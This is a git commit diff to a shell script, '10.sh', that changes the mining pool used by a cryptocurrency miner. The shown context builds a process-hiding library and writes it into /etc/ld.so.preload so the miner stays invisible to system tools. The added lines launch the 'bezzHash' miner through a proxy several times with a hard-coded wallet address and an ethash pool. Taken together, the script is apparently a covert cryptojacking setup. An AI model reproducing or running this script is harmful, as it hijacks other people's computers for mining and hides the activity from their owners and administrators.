ae0afa66523f4e193134d56e521ec2aed74f33ac
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-06-13 07:01:10 -0600

    Update 10.sh

--- 10.sh
+++ 10.sh
@@ -53,8 +53,18 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-solo-rvn.2miners.com:7070 --ocX
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
 
-./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia-solo-rvn.2miners.com:7070 --ocX
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
 
-./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@-solo-rvn.2miners.com:7070 --ocX
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
